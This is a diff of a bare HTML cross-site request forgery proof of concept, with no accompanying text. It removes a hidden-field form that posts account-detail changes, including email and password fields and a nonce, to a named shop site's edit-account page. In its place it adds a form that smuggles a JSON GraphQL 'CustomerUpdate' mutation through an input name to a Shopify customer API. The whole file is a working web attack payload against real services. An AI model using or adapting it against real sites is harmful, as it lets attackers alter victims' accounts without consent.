@@ -1,20 +1,11 @@
 <html>
 	<body>
-		<form method="POST" action="https://www.flowerzila.com/account/edit-account/">
-			<input type="hidden" name="account_first_name" value="sdlfsldf"/>
-			<input type="hidden" name="account_last_name" value="dsfsdf"/>
-			<input type="hidden" name="account_display_name" value="abiajay978686"/>
-			<input type="hidden" name="account_email" value="abiajay978686dsfsdf%40gmail.com"/>
-			<input type="hidden" name="password_current" value=""/>
-			<input type="hidden" name="password_1" value=""/>
-			<input type="hidden" name="password_2" value=""/>
-			<input type="hidden" name="save-account-details-nonce" value="a2877918c5"/>
-			<input type="hidden" name="_wp_http_referer" value="%2Faccount%2Fedit-account%2F"/>
-			<input type="hidden" name="save_account_details" value="Save+changes"/>
-			<input type="hidden" name="action" value="save_account_details"/>
+		<form method="POST" action="https://shopify.com/65326055654/account/customer/api/unstable/graphql?operation=CustomerUpdate">
+			<input type="hidden" name="{"operationName":"CustomerUpdate","variables":{"input":{"firstName":"bala","lastName":"d"}},"query":"mutation CustomerUpdate($input: CustomerUpdateInput!) {\n  customerUpdate(input: $input) {\n    customer {\n      id\n      firstName\n      lastName\n      emailAddress {\n        emailAddress\n        __typename\n      }\n      phoneNumber {\n        phoneNumber\n        __typename\n      }\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}"}" value="undefined"/>
 			<input type="submit" value="Submit">
 		</form>
 	</body>
 <html>
+
 
 
